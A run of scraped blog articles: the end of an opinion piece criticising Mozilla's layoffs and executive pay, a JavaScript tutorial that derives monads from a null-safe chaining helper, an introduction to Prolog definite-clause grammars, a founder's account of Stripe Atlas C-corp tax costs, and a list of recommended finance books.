by volunteers indirectly create money? Yes, absolutely. Does it encourage new learners to join the
technological future and start writing code? It probably does. Does it improve society? I believe
so.</p>

<p>This same argument, whether the ideals of FOSS software are worth state-funding, can be applied to
the Mozilla organization: Mozilla’s leadership should have chosen the ideal of <em>FOSS work
being done</em> over the ideal of free capitalism, and money-for-moneys-sake. It is especially hurtful
to hear that the company pays out massive salaries to its C-suite, which will not be significantly
cut “so as to remain competitive salaries for the positions”. In my opinion, this is a gross perversion of what working
for an idealist company (at least that is their image) means. I will argue that having ideals means
working with only the people who are willing to give up salary until they cannot live a default,
basic life.</p>

<p>We have reached this point because the economically-free US pushed us here: an idealist behemoth of a
company letting go of ideals due to funding concerns. Frankly, it’s shameful. A company whose main
product is free and open-source should have no single person earning more than any other, especially
not if that means firing 250 people. The
product(s) should be the single focus of the company, not whether they can find the best CEO in the
world to run the operation. Hire a worse CEO who will be paid the bare minimum but will at least try
to keep producing idealistically-sound software. In a perfect future, something like Mozilla would
be state funded, to create the healthy competition that a capitalist society so desperately needs,
and we would never be arguing any of these points.</p>

<br/>
August 15, 2020 | https://stopa.io/post/247 | <a href="https://web.archive.org/web/*/https://stopa.io/post/247">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>I got into a discussion about monads recently. On a search to find some resources to share, I realized that most essays explained them with type signatures and rules. A missing ingredient to grok them, I think, is to understand the intuition behind them. How could you end up <em>inventing</em> monads?</p><p>Okay, let’s try to build that intuition. We’ll avoid both types and category theory.</p><p>Say you have a few functions to get a user, a profile, and a display picture:</p><pre><code>function getUser(id) { 
  return USERS[id] 
}

function getProfile(user) { 
  return user.profile
}

function getDisplayPicture(profile) { 
  return profile.displayPicture
}</code></pre><p>Now, given an id, how would you get the profile picture?</p><p>You could write this: </p><pre><code>getDisplayPicture(getProfile(getUser(id)))</code></pre><p>Buut, this would throw an error: all these functions <em>could</em> return null. If <code>getUser</code> returned null for example, you would see: </p><pre><code>Uncaught TypeError: Cannot read property 'profile' of undefined</code></pre><p>To fix this, you may end up writing something like this:</p><pre><code>function getDisplayPictureFromId(id) { 
  const user = getUser(id)
  if (!user) return
  const profile = getProfile(user)
  if (!profile) return
  return getDisplayPicture(profile)
}</code></pre><p>But, this is getting pretty ugly. All these conditional returns distract from what you’re really trying to do. <strong>What if there was a way to get rid of these conditionals?</strong></p><p>So, that’s our challenge: let’s get rid of these conditionals. One way we can do this, is to make some kind of helper. This helper would let us chain these functions together: </p><pre><code>new Chainer(getUser(id))
  .whenExists(user =&gt; getProfile(user))
  .whenExists(profile =&gt; getDisplayPicture(profile))</code></pre><p>This looks pretty good. Let’s implement it.</p><h2>whenExists</h2><p><code>.whenExists</code> would only run the callback if the value exists. Here’s how you could write this:</p><pre><code>class Chainer {
  constructor(v) { 
      this.value = v
  }
  whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
  }
}</code></pre><p>And voila, with just this, we can now write</p><pre><code>function getProfilePictureFromId(id) { 
  return new Chainer(getUser(id))
    .whenExists(user =&gt; getProfile(user))
    .whenExists(profile =&gt; getDisplayPicture(profile))
}</code></pre><h2>More Problems</h2><p>Notice that <code>getDisplayPictureFromId</code> now returns a <code>Chainer</code>. </p><p>Imagine we had another function <code>resizeDisplayPicture</code>, that <em>also</em> returned a Chainer</p><pre><code>function resizeDisplayPicture(pic) { 
    return new Chainer(pic).whenExists(pic =&gt; ...
}</code></pre><p>What would happen, if we wrote:</p><pre><code>getProfilePictureFromId(id).whenExists(pic =&gt; resizeDisplayPicture(pic))</code></pre><p>Let’s look at whenExists again:</p><pre><code>whenExists(f) { 
  if (!this.value) return this;
  return new Chainer(f(this.value))
}</code></pre><p>If <code>getProfilePictureFromId(id)</code> did exist, we would run </p><pre><code>new Chainer(f(this.value))</code></pre><p>which in this case is</p><pre><code>new Chainer(resizeDisplayPicture(this.value)) </code></pre><p>Which becomes </p><pre><code>new Chainer(new Chainer(this.value)...</code></pre><p><strong>Uh oh. We now have a Chainer inside of a Chainer.</strong> Ideally, we’d want a function that somehow “merged” these chainers together.</p><h2>whenExistsMerge</h2><p>So let’s do that. We can call it <code>whenExistsMerge</code></p><pre><code>class Chainer {
  constructor(v) { 
      this.value = v
  }
  whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
  }
  whenExistsMerge(f) { 
      if (!this.value) return this;
      return f(this.value)
  }
}</code></pre><p>And with that, we can write </p><pre><code>getProfilePictureFromId(id)
  .whenExistsMerge(pic =&gt; resizeDisplayPicture(pic))
  .whenExists(resizedPic =&gt; ...)</code></pre><p><strong>Aand voila, you’ve just invented a specific type of monad.</strong> Kind of (1). Chainer is analogous to the <code>Maybe</code> monad. <code>whenExists</code> is analogous to its <code>fmap</code> operation, and <code>whenExistsMerge</code> is analogous to its <code>bind</code> operation. If you’re curious about the type-based technicalities now, <a href="http://adit.io/posts/2013-04-17-functors,_applicatives,_and_monads_in_pictures.html" target="_blank">see this essay</a>. </p><p>So, now we’ve found this cool <code>Chainer</code>. We can stop here, or think a bit further. What’s so special about it? </p><p>Well, it’s like a box that wraps around some information. We can interact with that box with  <code>whenExists</code> and <code>whenExistsMerge</code>.</p><p>How else can we use the idea of <code>box</code> and <code>whenExists?</code></p><p>Here’s one. Let’s say you were dealing with callback hell: </p><pre><code>fetchUser(id, (err, user) =&gt; {
  if (err) ... 
    fetchProfile(profile, (err, profile) =&gt; { 
      if (err) ...
        fetchDisplayPicture(...
    }
}</code></pre><p>What if we created something like an <code>Async Chainer</code>: it stores the result of some future computation. Then, you could use the <code>whenExists*</code> functions, which let you interact with the value <em>when</em> it is computed. We turn the callback hell into</p><pre><code> fetchUser(id).whenExistsMerge(fetchProfile).whenExistsMerge(fetchDisplayPicture)</code></pre><p>Well, replace <code>whenExistsMerge</code> with <code>then</code>, and you're on a road to discover <code>Promise</code>, which is also a monad. Kind of (2). </p><p>Now, it’s pretty cool to notice that both the nullable use case and the async use case have the same interface. The name <code>whenExists</code> may be a bit too specific. Really, what it does is give you an interface to <code>map</code> over the value. If you use the word <code>map</code>, <code>whenExistsMerge</code> really lets you <code>flatMap</code> over the value. </p><p>This begins to get us to the fundamental abstraction of a monad: a box, with an interface for <code>map</code>, and <code>flatMap</code>. As you look deeper, you’ll notice that this abstraction can handle a lot of other things. If you’re curious, research the <code>Result</code> monad for example.</p><p>And with that, you’ve invented monads : ) </p><h2>Aside: Do you <em>really</em> need this?</h2><p>As you went through this, you may have realized that there are other ways to solve the problems that monads solve. Instead of <code>Chainer</code>, your language could have a <a href="https://kotlinlang.org/docs/reference/null-safety.html#safe-calls" target="_blank">safe call</a> abstraction. Instead of <code>Promise</code>, your language could have an <code>async/await</code> abstraction. Sometimes those can be a better <a href="https://www.youtube.com/watch?v=YR5WdGrpoug" target="_blank">better choice</a>. Nevertheless, if your language doesn’t have those abstractions, you can use monads to solve them. And of course, like any powerful abstraction, you can invent new monads to simplify your business logic.</p><hr><p>(1) I cheated a bit with <code>Chainer</code>, by avoiding the subtypes <code>Just</code> and <code>Nothing</code>. This makes it so you can’t express something like <code>Just(null)</code>. Still, it gets at the essence : ) </p><p>(2) Likewise, <code>Promise</code> isn’t quite a monad, because it mixes both <code>flatMap</code> and <code>map</code> with <code>then</code>. This makes it so you can’t have a <code>Promise&lt;Promise&lt;Res&gt;&gt;</code>. Again though, it gets at the essence</p><p><em>Thanks to Joe Averbukh, Mark Shlick, Daniel Woelfel, Irakli Safareli, Jacky Wang for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>This document provides a brief introduction to logic grammars,
as background information for work on the representation of
XSD schemas in logic grammar form.</p><p>The term <i>logic grammar</i> is used to denote
grammars written in logic-programming systems; this paper describes
both <em>definite-clause grammars</em> (DCGs), which are a
built-in part of most Prolog systems, and <em>definite-clause
translation grammars</em> (DCTGs), which employ a similar formalism.
DCTGs closely resemble attribute grammars as described by [<a href="#id2633220">Knuth 1968</a>] and later writers and it is a bit easier to
handle complex or voluminous attribute value functions in DCTGs than
in DCGs.</p><p>Both DCGs and DCTGs can be regarded as syntactic sugar for straight
Prolog; before execution, both notations are translated into Prolog
clauses in the usual notation.</p><div>
<h2><a name="id2619314">1. </a>Definite-clause grammars</h2><p>This section reviews the basics of definite-clause grammars and their
notation.  I'll present a simple grammar in two or three versions,
to illustrate the use of DCG notation.</p><p>Readers who don't find this introduction detailed enough
may consult one of the Prolog books listed among the references.</p>
<div>
<h3><a name="id2614439">1.1. </a>Grammar E1: A trivial grammar for a fragment of English</h3><div><p>Here is a simple DCG for a trivially small fragment of English, 
which I'll call E1.  It is taken from example 8.1 in 
[<a href="#id2633257">König/Seiffert 1989</a>], an 
introduction to Prolog for linguists:</p><pre>%%% Grammar E1, a trivial fragment of English
s --&gt; np, vp.  % A sentence (s) is a noun phrase (np) 
               % plus a verb phrase
np --&gt; det, n. % A noun phrase is a determiner plus a noun
np --&gt; n.      % ... or just a noun.
vp --&gt; v, np.  % A verb phrase is a verb and its direct 
               % object, which is an np
vp --&gt; v.      % ... or just the verb (for intransitives).
n --&gt; [mary].  % 'mary', 'john', 'woman, 'man', 'apple' 
               % are nouns.
n --&gt; [john].
n --&gt; [woman].
n --&gt; [man].
n --&gt; [apple].
det --&gt; [the]. % 'the' is a determiner
v --&gt; [loves]. % 'loves', 'eats', and 'sings' are verbs.
v --&gt; [eats].
v --&gt; [sings].
</pre><p>
This grammar generates sentences like “John loves Mary”
and “The man sings” and “The woman eats the apple”,
as well as the somewhat less plausible “The apple sings the Mary.”</p></div><div><p>When a Prolog system consults a file containing this grammar,
the rules of the grammar are automatically translated into 
canonical Prolog clauses using <em>difference lists</em>:</p><pre>?- listing([s,np,vp,n,det,v]).

s(A, B) :-
        np(A, C),
        vp(C, B).

np(A, B) :-
        det(A, C),
        n(C, B).
np(A, B) :-
        n(A, B).

vp(A, B) :-
        v(A, C),
        np(C, B).
vp(A, B) :-
        v(A, B).

n([mary|A], A).
n([john|A], A).
n([woman|A], A).
n([man|A], A).
n([apple|A], A).

det([the|A], A).

v([loves|A], A).
v([eats|A], A).
v([sings|A], A).

Yes
?- </pre>
</div><div><p>
Difference lists are pairs of lists such that the second list is a
suffix of the first list (i.e. the same from some point or other to
the end), for example, the pair </p><tt>[a, b, c, d]</tt><p> and
</p><tt>[c, d]</tt><p>, which together denote the list </p><tt>[a,
b]</tt><p>, or (among the terminal rules above) </p><tt>[loves|A]</tt><p>
and </p><tt>A</tt><p>, which together denote the list
</p><tt>[loves]</tt><p>. Prolog-based parsers commonly use difference
lists to represent the input; they allow the Prolog clauses which
recognize structures in the input list to consume as much of the input
list (the first list in the pair) as they wish, and pass the rest of
the input (the second list in the pair) to the next clause.  If a DCG
predicate succeeds with its final two arguments unified to the
difference-list pair </p><tt>[a, b, c, d]</tt><p> and </p><tt>[c,
d]</tt><p>, what it means is that the grammar rule recognized the list
</p><tt>[a, b]</tt><p>.
</p></div><p>
In the clause for <i>s</i>, we can see how one part of the
parser picks up where another leaves off. The input list is
<i>A</i>, and the <i>np</i> predicate recognizes a
noun phrase at the beginning of <i>A</i>.  The portion of the
list which follows the noun phrase is assigned to <i>C</i>.
The predicate <i>vp</i> then tries to recognize a verb phrase
at the beginning of list <i>C</i>.  What is left after the
verb phrase is assigned, in turn, to list <i>B</i>, which is
both ‘<span>the part of the input list after the verb phrase</span>’
(in the predicate <i>vp</i>)
and (because the verb phrase can be the last item in a sentence)
also ‘<span>the part of the input after the <i>s</i></span>’
(in the predicate <i>s</i>).
</p><div><p>For example, given the sentence </p><tt>[the, woman, eats,
the, apple]</tt><p>, the first rule for <i>np</i> will
be called with its first argument bound to the entire input
string; after it recognizes the initial noun phrase, the
second argument will be bound to the part of the sentence
which follows the noun phrase, namely </p><tt>[eats,the,apple]</tt><p>.
The predicate <i>vp</i> will then recognize the
verb phrase </p><tt>[eats,the,apple]</tt><p>, leaving the empty
list </p><tt>[]</tt><p> as the part of the input after the sentence.[<a name="ref-to-id2614744" href="#id2614744">1</a>]
</p></div></div>
<div>
<h3><a name="id2614771">1.2. </a>Calling the parser</h3><div><p>
The following fragment of a Prolog session log shows how the
grammar can be used to test the grammaticality of sentences;
it also shows that the grammar could use some refinement.
To test whether a given sequence of tokens is an <i>s</i>,
we call the Prolog predicate <i>s</i> with two difference-list
arguments.  If we specify the empty list as the second argument,
we in effect require that the entire input sequence be a legal
sentence.

</p><pre>?-  s([john,loves,mary],[]).

Yes
?- s([the,woman,eats,the,apple],[]).

Yes
?- s([the,man,sings],[]).

Yes
?- s([apple,eats,woman,the],[]).

No
?- s([apple,sings,the,mary],[]).

Yes
?- </pre>
</div><div><p>We can use a variable as a second argument, instead of the
empty list; in this case, Prolog will tell us each prefix of the
input list which can be parsed as a sentence according to our grammar:
</p><pre>?- s([the,woman,eats,the,apple],Remainder).

Remainder = [] ;

Remainder = [the, apple] ;

No
?- </pre><p>
In one parse, the entire input is parsed as a sentence, and
the remainder is the empty list.  An alternative parse, however,
is just to take </p><tt>[the,woman,eats]</tt><p> as a sentence,
leaving </p><tt>[the,apple]</tt><p> as the remainder.</p></div></div>
<div>
<h3><a name="id2614874">1.3. </a>Grammar E2: A simple attribute grammar</h3><p>An <em>attribute grammar</em> is a context-free grammar in
which the nodes of the parse tree carry attributes (annotations in the
form of name-value pairs).  The values of attributes are calculated
according to specifications associated with the production rules of
the context-free grammar.  Attribute values may propagate top-down
(inherited attributes) or bottom-up (synthesized attributes) in the
parse tree.</p><p>An accessible formal description of attribute grammars is given
by [<a href="#id2632913">Alblas 1991</a>].  Informally, attribute
grammars are sometimes described as context-free grammars with
parameters on the non-terminals.</p><p>We can turn the simple context-free grammar E1 into an attribute
grammar by adding parameters to the productions; I will call the
attribute grammar E2.  In E2, one parameter is used to generate a 
structural description of the sentence, another to check for 
subject-verb agreement in grammatical number.</p><div><p>Thus extended with parameters, and a few more words in the
lexicon, the grammar looks like this:</p><pre>%%% E2: a trivial attribute grammar for a fragment of
%%% English, with a synthesized attribute for structural 
%%% description and enforcement of number agreement.

s(s(S,P)) --&gt; np(S,Num), vp(P,Num).
np(np(D,N),Num) --&gt; det(D,Num), n(N,Num).
np(np(N),pl) --&gt; n(N,pl).
np(np(N),sg) --&gt; pn(N,sg).
vp(vp(V,O),Num) --&gt; v(V,Num), np(O,_).
vp(vp(V),Num) --&gt; v(V,Num).
n(n(L),Num) --&gt; [L], { lex(L,n,Num) }.
pn(pn(L),Num) --&gt; [L], { lex(L,pn,Num) }.
v(v(L),Num) --&gt; [L], { lex(L,v,Num) }.
det(det(L),Num) --&gt; [L], { lex(L,det,Num) }.

lex(mary,pn,sg).
lex(john,pn,sg).
lex(woman,n,sg).
lex(women,n,pl).
lex(man,n,sg).
lex(men,n,pl).
lex(apple,n,sg).
lex(apples,n,pl).
lex(the,det,_).
lex(some,det,pl).
lex(one,det,sg).
lex(loves,v,sg).
lex(love,v,pl).
lex(eats,v,sg).
lex(eat,v,pl).
lex(sings,v,sg).
lex(sing,v,pl).
</pre></div><div><p>When parsed with this grammar, the sentence 
“John loves Mary” is assigned the structure </p><tt>s(np(pn(john)),
vp(v(loves), np(pn(mary))))</tt><p> — or, with
pretty-printing:</p><pre>s(
  np(
     pn(john)
    ), 
  vp(
     v(loves), 
     np(
        pn(mary)
       )
    )
 )</pre><p>
Here, the grammatical structure for each non-terminal on the
left-hand side of a grammar rule is synthesized from
the grammatical structures of the non-terminals on the right-hand side
of the rule.  So it's a synthetic attribute.</p></div><p>On some productions, a second parameter is used to enforce
agreement in number between subject and verb and between
determiner and noun.  Here, Prolog's unification mechanism makes
it unnecessary to distinguish between synthetic and inherited
attributes.  The sentence is grammatical if and only if the
number (<i>Num</i>) of the <i>np</i> and that of
the <i>vp</i> agree; whether the attribute flows bottom-up
on each of these, or bottom-up on one and top-down on the other
need not concern us.</p><div><p>In this version of the grammar, it is worth calling the reader's
attention to the Prolog clauses enclosed in braces on the right-hand
side of some rules, e.g. in 
</p><pre>n(n(L),Num) --&gt; [L], { lex(L,n,Num)}.</pre><p>
These Prolog clauses express constraints on the grammatical
construction which are not themselves grammatical constituents.  They
are sometimes called ‘guards’ (e.g. by [<a href="#id2632980">Brown/Blair 1990</a>]); they correspond directly to
the ‘semantic conditions’ which are a constituent
part of attribute grammars as described by [<a href="#id2632913">Alblas 1991</a>].  With the guard, this rule can be paraphrased as
saying “A noun (an <i>n</i>), has the structure
</p><tt>n(L)</tt><p> and the grammatical number </p><tt>Num</tt><p>,
<em>if</em> (a) <i>L</i> (for ‘lexical
form’) is a single item in the input list </p><tt>[L]</tt><p>,
and (b) the relation <i>lex</i> contains the triple
</p><tt>(L,n,Num)</tt><p>.”</p></div><p>Such guards will be present in many of the rules we use
to represent XML Schema in logic grammars.</p><div><p>By calling the grammar rules, we can instantiate a variable
with the structural description of the sentence.</p><pre>?- s(Struc,[john,loves,mary],[]).

Struc = s(np(pn(john)), vp(v(loves), np(pn(mary)))) 

Yes
?- s(S,[the,woman,eats,the,apple],[]).

S = s(np(det(the), n(woman)), vp(v(eats), np(det(the), n(apple)))) 

Yes
?- s(S,[the,man,sings],[]).

S = s(np(det(the), n(man)), vp(v(sings))) 

Yes
?- s(S,[apple,sings,the,mary],[]).

No
?- s(S,[the,apple,sings,mary],[]).

S = s(np(det(the), …</pre></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    

    
      <section>
        <p><em>Disclaimer: this blog post doesn’t constitute accounting advice. When in doubt, talk to a lawyer/accountant and all that jazz.</em></p>

<h2 id="background">Background</h2>

<p>I incorporated a C Corp in the State of Delaware via Stripe Atlas in February 2019.</p>

<p>Taxes must be one of the scariest aspects precluding folks from going into a business. Below is an account of how I <del>struggled</del> dealt with the first tax season.</p>

<p>All usual disclaimers apply.</p>

<h2 id="why-a-c-corp-instead-of-an-llc">Why a C-Corp instead of an LLC?</h2>

<p>I have no intention of raising investment and try to minimize complexity as much as I can.</p>

<p>After brief research, I found out that a single-member LLC (regarded as a pass-through entity by default) complicates tax situation for nonresident aliens - a term-of-art for non-US citizens &amp; residents.</p>

<p>While C Corps are more complex to run, their tax treatment is relatively straightforward: they’re only taxed on their profits. If you’re paying yourself a salary, you can expense that amount, which will lower your taxable income (note that if you’re residing in the US, you <em>might need</em> to withhold 30% of a salary as a tax, in addition to paying a payroll tax. It gets complicated, fast).</p>

<p>If you’re a US citizen or a resident, LLC is more apt if you plan to bootstrap your business.</p>

<h2 id="registered-agent">Registered agent</h2>

<p>Companies formed in the State of Delaware are required to keep a registered agent in the state. Think of it as an address state and federal agencies use to get ahold of you. Unfortunately, the registered agent that comes with Atlas can’t accept general mail (except for bank cards).</p>

<p>Somewhere around mid-January, you will receive an email from Stripe asking whether you want to renew the registered agent. If you do nothing, they will charge your card $100 at the end of January.</p>

<p>Some virtual address providers (aka CMRA) can act as your registered agent. That way, you can avoid the $100 fee for the registered agent that comes with Atlas. To change the registered agent, you will have to complete a “Change of Address” form.</p>

<h2 id="delaware-franchise-tax">Delaware Franchise Tax</h2>

<p>While Delaware doesn’t have a sales tax, they do impose a <em>Franchise Tax</em> on registered businesses.</p>

<p>There are two ways to calculate the Franchise Tax: Authorized Shares Method and Assumed Par Value Capital Method. I won’t get into a <a href="https://corp.delaware.gov/frtaxcalc/">nitty gritty</a>, but suffice it to say that you can use one that minimizes your tax liability.</p>

<p>A lot of folks running C Corps get stupendously high tax estimates amounting to tens or hundreds of thousands of dollars. It happens because the State of Delaware uses an Authorized Shares Method that results in higher tax bills. Once you switch to the Assumed Par Value Capital Method, your tax liability will (probably) drop to $450.</p>

<p>You don’t need an accountant to file an annual report, although the user interface is horrendous, to put it mildly.</p>

<p>One thing that I wish I’d known is that you can save on the Franchise Tax by authorizing 5000 shares (or less) instead of 10,000,000 shares, which is the Atlas’ default. That way, your tax due will be $225 ($175 minimum tax + $50 annual report filing fee) instead of $450. LLCs, pay a flat $300 tax.</p>

<h2 id="corporate-income-taxes">Corporate income taxes</h2>

<p>You pay corporate income taxes on the profit you make during the tax year. Even if you didn’t earn a single cent from the business, you still have to file a tax report by April 15th (you can ask the <abbr title="Internal Revenue Service">IRS</abbr> to extend the deadline).</p>

<p>Nothing precludes you from filing tax reports yourself. Unless you know what you’re doing, you will probably screw it up (terribly) and waste a lot of time that you otherwise can spend on running your business (tax reporting shouldn’t be that complex, but that’s a topic for another day). Stripe Atlas has partnered with two accounting firms offering tax preparation services at a discount.</p>

<p>Your accountant will ask you to fill a questionnaire and provide a balance sheet and an income (P&amp;L) statement for the previous financial year, so you will have to take care of the bookkeeping before talking to the accountant.</p>

<p>Because I’m a foreigner owning more than 25% of a US corporation, I have to file Form 5472 as well (in addition to Form 1120). The inaccurate filling or failure to file it usually carries a $25,000 fine. In that light, it’s better to pay an accountant and not worry about it.</p>

<p>Make sure you have an <abbr title="Electronic Federal Tax Payment System">EFTPS</abbr> pin code before the tax season. However, judging by the number of discussions on the Stripe Atlas forum, a lot of folks outside the US don’t receive that mail. To add an insult to the injury, they don’t give you the pin code over the phone. If you’re outside of the US, get yourself a mailing address in the US, and ask the IRS to mail you the EFTPS pin code.</p>

<h2 id="numbers">Numbers</h2>

<table>
  <thead>
    <tr>
      <th>Item</th>
      <th>Cost</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Registered agent</td>
      <td>$100</td>
    </tr>
    <tr>
      <td>Delaware Franchise Tax (C Corp)</td>
      <td>$450</td>
    </tr>
    <tr>
      <td>Accounting service (discounted)</td>
      <td>$250</td>
    </tr>
  </tbody>
</table>

<p>So with the default Stripe Atlas setup, you’re looking at $800 for yearly maintenance at a minimum (without federal taxes). If you opt to use a default bank account provided by Atlas (SVB), add $300 on top of that ($25 x 12).</p>

<p>If you plan to incorporate towards the end of the year, wait until January. That way, you can <em>skip</em> one tax year and spend time building a business instead of doing with soul-sucking administrative busywork.</p>

<p>Some taxes I haven’t mentioned are state taxes (other than Delaware), sales taxes, and EU VAT. I haven’t had to deal with them yet.</p>

<p>Besides podcasts, blogs, vlogs, etc. reading books is still something many software developers don’t want to miss.</p>
<p>Although I have read many good books covering software engineering and other things in tech, I’m currently studying finances and investments. I want to learn their “best practices” just like in programming.</p>
<p><strong>Today there are hundreds (if not thousands) of books on wealth growth, and obviously, it’s impossible to skim all of them because the average person reads between 25 and 30 books per year.</strong> Hence, finding the ones worth reading in finance and investment to accomplish your financial goals like below is not that easy; at least it wasn’t for me.</p>
<blockquote><div lang="en" dir="ltr"><p>Financial Goals To Start Now:</p><p>- Build an Emergency Fund of 10k</p><p>- Save / Invest 25-50% of Income Per Month</p><p>- Read 10 Books About Finance </p><p>- Find a New Side Hustle </p><p>- Pay Off Your Debt </p><p>- Track Your Expenses </p><p>- Monetize a New Skill </p><p>- Buy Real Estate</p></div>— Real Estate John 🏡 (@john_moore7) <a href="https://twitter.com/john_moore7/status/1282810412841472001?ref_src=twsrc%5Etfw">July 13, 2020</a></blockquote> 
<p>However, there are evergreens available, books that are still relevant today, and often recommended by investors, financial experts, and people who are interested in investment in general.</p>
<p><strong>Here are my top-10 books.</strong> I would recommend reading these for any software developer or person in tech, who is willing to become financially literate, set up their financial goals, reach financial independence and early retirement:</p>
<h2 id="1-the-intelligent-investorhttpsamznto3kklamy"><a href="https://amzn.to/3kKLaMy">1. The Intelligent Investor</a></h2>
<p>It’s the definitive book on value investing written by none other than Benjamin Graham, Warren Buffett’s tutor.</p>
<p>The author preaches diversification, prudence, and the importance of not getting caught up in bull markets—speculative investments during bull markets can lead to huge loss of principal investment.</p>
<p>Graham also pointed out that <strong>investors should look at the underlying value of a business before investing in any company business:</strong> there are no good or bad stocks; there are undervalued and overvalued ones.</p>
<p>Investing formula from the book: buy more shares when the market is low than when it is high, and it’ll likely end up with satisfactory overall pricing for your investor’s holdings.</p>
<p><strong>There are three principles of intelligent investing:</strong></p>
<ol>
<li>
<p>An intelligent investor always analyzes the long-term evolution and management policies of a company before investing.</p>
</li>
<li>
<p>An intelligent investor always protects themselves from losses by diversifying investments.</p>
</li>
<li>
<p>An intelligent investor never looks for crazy returns but focuses on safe and steady profit.</p>
</li>
</ol>
<p><strong>In Buffett’s words:</strong></p>
<p>Rule No. 1: Never lose money.
Rule No. 2: Never forget, Rule No. 1.</p>

<hr>
<h2 id="2-common-stocks-and-uncommon-profitshttpsamznto3flaidc"><a href="https://amzn.to/3fLAidC">2. Common Stocks And Uncommon Profits</a></h2>
<p>Fantastic if you are interested in what makes any business tick!</p>
<p><strong>This is the only investment book I ever read and even studied that gave me a feeling of being “well-equipped” with the potential to become a successful investor.</strong></p>
<p>Fisher’s guidelines are quite helpful, but they are mostly qualitative-based compared to those of Graham’s and Buffett’s, which are more quantitative, like how to research management and qualitative details of a company; R&amp;D investments; what the company’s doing to improve margins, among other criteria.</p>
<p>In my own experience, I have tried to apply some of the few tricks and tips from the author, which helped me answer the questions while analyzing stocks because I know that the growth stock (when bought young) offers by far the highest possibility of gain.</p>
<p>Comprehensible and timeless investment classical book that should be read by anyone serious about achieving success in the stock market.</p>

<hr>
<h2 id="3-unshakeablehttpsamznto30mm4en"><a href="https://amzn.to/30Mm4EN">3. Unshakeable</a></h2>
<p>If you understand mathematics, you will definitely understand money.</p>
<p>I am not a fan of Tony Robbins, but in his book, Tony provides <strong>the best explanation of why most people don’t make it in the markets, and the minority does.</strong> The main focus is on</p>
<ul>
<li>
<p>core principles of investing</p>
</li>
<li>
<p>asset allocation</p>
</li>
<li>
<p>investor psychology</p>
</li>
<li>
<p>admin fees</p>
</li>
<li>
<p>tax laws</p>
</li>
</ul>
<p>For instance, even though his book most US-centric on US tax law examples, while being a tax resident in Germany, I knew not much about tax laws in Germany. Still, the theory behind these principles is the same in the majority of developed and developing countries. That’s why always make sure you invest in a way that is the most tax-efficient, and you don’t get a hefty chunk of money removed from your profit when you come to withdraw.</p>
<p><strong>The core lesson is to shape your mindset into unshakeable financially,</strong> which requires determination, integrity, smart working, knowledge, and forward-thinking!</p>

<hr>
<h2 id="4-rich-dad-poor-dadhttpsamznto2cmykss"><a href="https://amzn.to/2CmyKsS">4. Rich Dad Poor Dad</a></h2>
<p>If you stop working today, how long can you survive?</p>
<p><strong>No. 1 advice on how to make your assets work for you, so you can quit your job, enjoy life, and make money while having a dream life.</strong></p>
<p>The truth that the rich dad focuses on generating income and assets, and the poor dad and middle-class dad view their liabilities as an asset.</p>
<p><strong>This book is a must for everyone who is looking for financial independence.</strong> It will help you to grow your mindset towards money and shows you how people, in reality, are held back in terms of finance due to their upbringing.</p>
<p>Poor people work for money, while rich people make money work for them.</p>

<hr>

<h2 id="5-the-richest-man-in-babylonhttpsamznto2difwhx"><a href="https://amzn.to/2DIfwhX">5. The Richest Man in Babylon</a></h2>
<p>There’s nothing truly revolutionary in the book published in 1926, which is why I like it. It is a bit of a fiction, but the stories bring out important lessons.</p>
<p>I was lead to this book by “Rich Dad Poor Dad,” and this book further explains what Robert means by “pay myself first.”</p>
<p><strong>The underlying message is to spend less than you make and save (invest) the rest.</strong></p>
<p>Perhaps the most significant book takeaway is that wealth goes as quickly as it comes if in the hands of a negligent person, in other words, in the hands of a materialistic consumer.</p>
<p>If you haven’t read this book yet, you must do it. It’s a powerful read on wealth creation.</p>

<h2 id="6-the-4-hour-workweek-escape-9-5-live-anywhere-and-join-the-new-richhttpsamznto30rmts1"><a href="https://amzn.to/30RMtS1">6. The 4-Hour Workweek: Escape 9-5, Live Anywhere, and Join the New Rich</a></h2>
<p>A bestseller should be read by those who want more from their working time and money-making assets and expand the time available for passions.</p>
<p><em>“Someday” is a disease that will take your dreams to the grave with you.”—Tim Ferriss</em></p>
<p>In short, try to eliminate as much as you can of your life, to travel lighter and faster.</p>
<p>Another question you have is <strong>how you can work 4 hours per week?</strong></p>
<p>The receipt in a nutshell:</p>
<ul>
<li>Don’t work too much for someone</li>
<li>Earn the same money for less amount of work</li>
</ul>
<p>Tim Ferriss earns around $90000 per month with 4 hours of work per week. <strong>How does he do it exactly?</strong> More importantly, how can you do it, the answer you can find is by reading his book.</p>

<hr>
<h2 id="7-the-dhandho-investor-the-low-risk-value-method-to-high-returnshttpsamznto33rhmyu"><a href="https://amzn.to/33RhmYu">7. The Dhandho Investor: The Low-Risk Value Method to High Returns</a></h2>
<p>Instead of unnecessary complexity, it’s well written and easy to read.</p>
<p><strong>The author is an expert at finding undervalued company stocks.</strong> He explains a few of his investing ideas and thought processes behind stocks in a simple way.</p>
<p>The book is based on the philosophy of “Heads I win, tails I don’t lose much.” It mainly focuses on the stock market and gives you some basics, practical principles, and useful examples that you can apply in stock investments in general.</p>
<p><strong>Just read, learn, and then earn by applying!</strong></p>

<hr>
<h2 id="8-the-elements-of-investinghttpsamznto33o5y9g"><a href="https://amzn.to/33O5y9g">8. The Elements of Investing</a></h2>
<p>This book is clear and to the point about how to be a long-term investor to pursue average market gains with minimal losses.</p>
<p>Though it is a heavy emphasis on sticking to <a href="https://ilonacodes.com/investor-profile/?r=ic">your financial plan that fits your risk profile</a>, asset class allocation, and investing in index funds and ETFs, keep it simple and passive as much as possible.</p>
<p>It’s an excellent overview of investing, especially when saving for retirement. The book is down-to-earth and straight to the point. It contains a lot of valuable advice for any new person who wants to start investing and understanding financial jargon.</p>
<p><strong>Invest smart, invest early, invest often.</strong></p>

<hr>
<h2 id="9-the-little-book-of-common-sense-investinghttpsamznto2y7o04d"><a href="https://amzn.to/2Y7O04D">9. The Little Book of Common Sense Investing</a></h2>
<p>Beginner investors will not go wrong, implementing the advice outlined by the author!</p>
<p>Because <strong>it is very applicable to the many individual investors today:</strong> investing in index funds is a great low-cost and low-maintenance way to profit and get the market’s return.</p>
